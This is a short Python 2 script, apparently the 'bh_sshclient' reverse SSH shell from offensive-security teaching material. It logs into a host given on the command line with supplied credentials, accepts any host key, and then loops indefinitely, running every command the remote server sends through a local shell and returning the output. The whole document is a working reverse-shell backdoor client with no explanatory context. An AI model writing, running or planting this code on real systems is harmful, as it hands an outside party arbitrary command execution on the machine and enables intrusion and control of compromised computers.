#!/bin/python
import threading,paramiko,subprocess,sys
def ssh_command(ip,user,passwd,command):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passwd)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print ssh_session.recv(1024)
        while True:
            command=ssh_session.recv(1024)
            try:
                output=subprocess.check_output(command,shell=True)
                ssh_session.send(output)
            except Exception,e:
                ssh_session.send(str(e))
        client.close()
    return
try:
    ssh_command(sys.argv[1],sys.argv[2],sys.argv[3],'ClientConnected')
except Exception,x:
    print 'Useage: bh_sshclient -ip -user -password'
    sys.exit(1)
        
        